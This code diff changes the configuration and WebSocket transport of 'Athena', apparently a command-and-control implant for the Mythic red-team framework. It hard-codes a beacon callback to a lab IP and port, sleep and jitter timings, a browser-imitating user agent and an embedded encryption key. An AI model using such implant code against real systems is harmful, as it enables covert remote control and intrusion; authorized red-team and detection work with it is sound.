@@ -20,19 +20,12 @@ namespace Athena.Config
 
         public MythicConfig()
         {
-            //this.uuid = "%UUID%";
-            //this.killDate = DateTime.Parse("killdate");
-            //int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
-            //this.sleep = sleep;
-            //int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
-            //this.jitter = jitter;
-            //this.currentConfig = new Websocket(this.uuid);
-            this.uuid = "b3b72cb5-8e39-498f-9b27-525d05ac394e";
-            DateTime kd = DateTime.TryParse("2022-08-25", out kd) ? kd : DateTime.MaxValue;
+            this.uuid = "2297698f-c669-45ae-a052-3f40877720dd";
+            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
-            int sleep = int.Parse("0", out sleep) ? sleep : 60;
+            int sleep = int.TryParse("10", out sleep) ? sleep : 60;
             this.sleep = sleep;
-            int jitter = int.Parse("0")
+            int jitter = int.TryParse("37", out jitter) ? jitter : 10;
             this.jitter = jitter;
             this.currentConfig = new Websocket(this.uuid);
             this.smbConfig = new SmbServer();
@@ -56,26 +49,17 @@ namespace Athena.Config
 
         public Websocket(string uuid)
         {
-            //int callbackPort = Int32.Parse("callback_port");
-            //string callbackHost = "callback_host";
-            //string callbackURL = $"{callbackHost}:{callbackPort}/{endpoint}";
-            //this.endpoint = "ENDPOINT_REPLACE";
-            //this.userAgent = "USER_AGENT";
-            //this.hostHeader = "%HOSTHEADER%";
-            //this.psk = "AESPSK";
-            //this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
             int callbackPort = Int32.Parse("8081");
             string callbackHost = "ws://10.10.50.43";
             this.endpoint = "socket";
-            string callbackURL = $"{callbackHost}:{callbackPort}/{endpoint}";
-            this.userAgent = "USER_AGENT";
+            string callbackURL = $"{callbackHost}:{callbackPort}/{this.endpoint}";
+            this.userAgent = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
             this.hostHeader = "%HOSTHEADER%";
-            this.psk = "";
-            this.encryptedExchangeCheck = bool.Parse("False");
+            this.psk = "zKaP7ZQpREycsb6SAuzIFSv3P8/m4yfkE9udfvPBNoI=";
+            this.encryptedExchangeCheck = bool.Parse("True");
             if (!string.IsNullOrEmpty(this.psk))
             {
                 this.crypt = new PSKCrypto(uuid, this.psk);
-                //Globals.encrypted = true;
                 this.encrypted = true;
             }
 
@@ -87,16 +71,18 @@ namespace Athena.Config
         {
             try
             {
+                Console.WriteLine(url);
                 ws = new ClientWebSocket();
                 ws.ConnectAsync(new Uri(url), CancellationToken.None);
                 while (ws.State != WebSocketState.Open)
                 {
                 }
-
+                Console.WriteLine("Connected.");
                 return true;
             }
-            catch
+            catch (Exception e)
             {
+                Console.WriteLine(e.Message);
                 return false;
             }
         }
@@ -106,12 +92,6 @@ namespace Athena.Config
             try
             {
                 string json = JsonConvert.SerializeObject(obj);
-
-                if (json != "{\"action\":\"get_tasking\",\"tasking_size\":-1,\"socks\":[],\"delegates\":[]}")
-                {
-                    //Console.WriteLine(json);
-                }
-
                 if (this.encrypted)
                 {
                     json = this.crypt.Encrypt(json);
@@ -120,7 +100,6 @@ namespace Athena.Config
                 {
                     json = Misc.Base64Encode(Globals.mc.MythicConfig.uuid + json);
                 }
-
                 WebSocketMessage m = new WebSocketMessage()
                 {
                     Client = true,
@@ -139,7 +118,6 @@ namespace Athena.Config
                 }
                 else
                 {
-                    //Console.WriteLine(Misc.Base64Decode(m.Data).Substring(36));
                     return Misc.Base64Decode(m.Data).Substring(36);
                 }
             }
